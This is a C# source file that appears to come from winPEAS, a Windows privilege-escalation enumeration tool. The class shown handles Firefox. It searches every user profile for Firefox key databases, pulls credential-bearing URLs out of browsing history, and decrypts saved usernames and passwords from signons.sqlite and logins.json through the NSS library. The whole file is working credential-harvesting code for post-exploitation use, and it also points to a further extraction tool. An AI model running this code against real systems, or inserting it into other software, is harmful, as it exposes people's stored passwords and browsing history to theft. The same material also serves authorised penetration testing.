using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;
using winPEAS._3rdParty.SQLite;
using winPEAS.Checks;
using winPEAS.Helpers;
using winPEAS.KnownFileCreds.Browsers.Models;

namespace winPEAS.KnownFileCreds.Browsers.Firefox
{
    internal class Firefox : BrowserBase, IBrowser
    {
        public override string Name => "Firefox";

        public override void PrintInfo()
        {
            PrintSavedCredentials();
            PrintDBsFirefox();
            PrintHistFirefox();
        }

        private static void PrintDBsFirefox()
        {
            try
            {
                Beaprint.MainPrint("Looking for Firefox DBs");
                Beaprint.LinkPrint("https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history");
                List<string> firefoxDBs = GetFirefoxDbs();
                if (firefoxDBs.Count > 0)
                {
                    foreach (string firefoxDB in firefoxDBs) //No Beaprints because line needs red
                    {
                        Beaprint.BadPrint("    Firefox credentials file exists at " + firefoxDB);
                    }

                    Beaprint.InfoPrint("Run SharpWeb (https://github.com/djhohnstein/SharpWeb)");
                }
                else
                {
                    Beaprint.NotFoundPrint();
                }
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }
        }

        private static void PrintHistFirefox()
        {
            try
            {
                Beaprint.MainPrint("Looking for GET credentials in Firefox history");
                Beaprint.LinkPrint("https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history");
                List<string> history = GetFirefoxHistory();
                if (history.Count > 0)
                {
                    Dictionary<string, string> colorsB = new Dictionary<string, string>()
                    {
                        { Globals.PrintCredStrings, Beaprint.ansi_color_bad },
                    };

                    foreach (string url in history)
                    {
                        if (MyUtils.ContainsAnyRegex(url.ToUpper(), Browser.CredStringsRegex))
                        {
                            Beaprint.AnsiPrint("    " + url, colorsB);
                        }
                    }
                    Console.WriteLine();

                    int limit = 50;
                    Beaprint.MainPrint($"Firefox history -- limit {limit}\n");
                    Beaprint.ListPrint(history.Take(limit).ToList());
                }
                else
                {
                    Beaprint.NotFoundPrint();
                }
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }
        }

        private static List<string> GetFirefoxDbs()
        {
            List<string> results = new List<string>();
            // checks if Firefox has a history database
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
                    var dirs = Directory.EnumerateDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];

                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userFirefoxBasePath = $"{dir}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
                            if (Directory.Exists(userFirefoxBasePath))
                            {
                                var directories = Directory.EnumerateDirectories(userFirefoxBasePath);
                                foreach (string directory in directories)
                                {
                                    string firefoxCredentialFile3 = $"{directory}\\{"key3.db"}";
                                    if (File.Exists(firefoxCredentialFile3))
                                    {
                                        results.Add(firefoxCredentialFile3);
                                    }

                                    string firefoxCredentialFile4 = $"{directory}\\{"key4.db"}";
                                    if (File.Exists(firefoxCredentialFile4))
                                    {
                                        results.Add(firefoxCredentialFile3);
                                    }
                                }
                            }
                        }
                    }
                }
                else
                {
                    string userName = Environment.GetEnvironmentVariable("USERNAME");
                    string userFirefoxBasePath =
                        $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";

                    if (Directory.Exists(userFirefoxBasePath))
                    {
                        var directories = Directory.EnumerateDirectories(userFirefoxBasePath);
                        foreach (string directory in directories)
                        {
                            string firefoxCredentialFile3 = $"{directory}\\{"key3.db"}";
                            if (File.Exists(firefoxCredentialFile3))
                            {
                                results.Add(firefoxCredentialFile3);
                            }

                            string firefoxCredentialFile4 = $"{directory}\\{"key4.db"}";
                            if (File.Exists(firefoxCredentialFile4))
                            {
                                results.Add(firefoxCredentialFile4);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }

            return results;
        }

        private static List<string> GetFirefoxHistory()
        {
            List<string> results = new List<string>();
            try
            {
                if (MyUtils.IsHighIntegrity())
                {
                    string userFolder = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";
                    var dirs = Directory.EnumerateDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userFirefoxBasePath = $"{dir}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
                            results = ParseFirefoxHistory(userFirefoxBasePath);
                        }
                    }
                }
                else
                {
                    string userFirefoxBasePath =
                        $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
                    results = ParseFirefoxHistory(userFirefoxBasePath);
                }
            }
            catch (Exception ex)
            {
                Beaprint.PrintException(ex.Message);
            }
            return results;
        }

        private static List<string> ParseFirefoxHistory(string path)
        {
            List<string> results = new List<string>();
            // parses a Firefox history file via regex
            if (Directory.Exists(path))
            {
                var directories = Directory.EnumerateDirectories(path);
                foreach (string directory in directories)
                {
                    string firefoxHistoryFile = string.Format("{0}\\{1}", directory, "places.sqlite");
                    Regex historyRegex = new Regex(@"(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?");

                    try
                    {
                        using (StreamReader r = new StreamReader(firefoxHistoryFile))
                        {
                            string line;
                            while ((line = r.ReadLine()) != null)
                            {
                                Match m = historyRegex.Match(line);
                                if (m.Success)
                                {
                                    results.Add(m.Groups[0].ToString().Trim());
                                }
                            }
                        }
                    }
                    catch (IOException exception)
                    {
                        Console.WriteLine("\r\n    [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).", exception.Message);
                    }
                    catch (Exception ex)
                    {
                        Beaprint.PrintException(ex.Message);
                    }
                }
            }
            return results;
        }

        public override IEnumerable<CredentialModel> GetSavedCredentials()
        {
            var logins = new List<CredentialModel>();

            string signonsFile = null;
            string loginsFile = null;
            bool signonsFound = false;
            bool loginsFound = false;

            try
            {
                var dirs = Directory.EnumerateDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles")).ToList();

                if (!dirs.Any())
                {
                    return logins;
                }

                foreach (string dir in dirs)
                {
                    if (Directory.Exists(dir))
                    {
                        string[] files = Directory.EnumerateFiles(dir, "signons.sqlite").ToArray();
                        if (files.Length > 0)
                        {
                            signonsFile = files[0];
                            signonsFound = true;
                        }

                        // find &quot;logins.json"file
                        files = Directory.EnumerateFiles(dir, "logins.json").ToArray();
                        if (files.Length > 0)
                        {
                            loginsFile = files[0];
                            loginsFound = true;
                        }

                        if (loginsFound || signonsFound)
                        {
                            FFDecryptor.NSS_Init(dir);
                            break;
                        }
                    }

                }

                if (signonsFound)
                {
                    SQLiteDatabase database = new SQLiteDatabase("Data Source=" + signonsFile + ";");
                    string query = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
                    DataTable resultantQuery = database.ExecuteQuery(query);

                    if (resultantQuery.Rows.Count > 0)
                    {
                        foreach (DataRow row in resultantQuery.Rows)
                        {
                            string encryptedUsername = row["encryptedUsername"] is System.DBNull ? string.Empty : (string)row["encryptedUsername"];
                            string encryptedPassword = row["encryptedPassword"] is System.DBNull ? string.Empty : (string)row["encryptedPassword"];
                            string hostname = row["hostname"] is System.DBNull ? string.Empty : (string)row["hostname"];

                            string username = FFDecryptor.Decrypt(encryptedUsername);
                            string password = FFDecryptor.Decrypt(encryptedPassword);

                            logins.Add(new CredentialModel
                            {
                                Username = username,
                                Password = password,
                                Url = hostname
                            });
                        }

                        database.CloseDatabase();
                    }
                }

                if (loginsFound)
                {
                    FFLogins ffLoginData;
                    using (StreamReader sr = new StreamReader(loginsFile))
                    {
                        string json = sr.ReadToEnd();

                        ffLoginData = new JavaScriptSerializer().Deserialize<FFLogins>(json);
                    }

                    foreach (Browsers.Firefox.LoginData loginData in ffLoginData.logins)
                    {
                        string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                        string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
                        logins.Add(new CredentialModel
                        {
                            Username = username,
                            Password = password,
                            Url = loginData.hostname
                        });
                    }
                }
            }
            catch (Exception e)
            {
            }

            return logins;
        }
    }
}
